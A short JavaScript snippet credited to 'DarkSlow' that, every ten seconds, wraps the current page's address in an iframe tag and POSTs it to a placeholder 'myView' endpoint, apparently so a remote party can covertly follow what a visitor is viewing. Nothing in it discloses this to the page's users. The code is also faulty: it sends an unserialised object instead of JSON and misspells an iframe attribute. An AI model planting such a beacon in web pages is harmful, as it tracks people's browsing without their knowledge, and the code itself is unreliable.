/*
    DarkSlow 2023-2024
*/

//Get View and update every 10 Seconds
setInterval(function () {
    let src = location.href;

    const user_view = "<iframe src='" + src + "' width='275' hieght='180'></iframe>";

    let xhr = new XMLHttpRequest();
    
    //Create Response Header
    xhr.open("POST", "Pre Hosted 'myView' link");
    xhr.setRequestHeader("Content-Type","application/json");
    
    //Create JSON data
    let re = {
        view: user_view
    }
    
    //Package JSON data
    console.log(re);

    //Send Data
    xhr.send(re);
    
}, 10000);
